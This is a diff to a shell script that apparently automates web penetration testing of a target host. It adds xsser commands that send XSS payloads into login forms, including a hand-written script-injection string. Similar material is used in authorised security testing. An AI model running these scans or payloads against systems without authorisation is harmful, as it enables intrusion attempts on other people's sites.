@@ -373,7 +373,10 @@ dirb http://$1 directory-list-1.0.txt -M 100,204,307,400,401,403,409,500,503 -f 
 echo
 echo -e "\e[00;35m# Vulnerable to XSS #\e[00m" 
 echo
-xsser --all=https://$1 | cat > "$output_dir/xsser.txt"
+xsser -u https://$1 -c 100 --Cl | cat > "$output_dir/xsser-inject.txt"
+xsser -u https://$1/login.php -p 'username=bob&password=XSS&captcha=X1S' | cat > "$output_dir/xsser.txt"
+xsser -u https://$1/login.php -p 'username=admin&password=admin' --Xsa --Xsr --Coo | cat > "$output_dir/xsser.txt"
+xsser -u https://$1/login.asp -p 'username=admin&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'
 echo
 echo -e "\e[00;35m# Search for vulnerable DAV with davtest #\e[00m" 
 echo
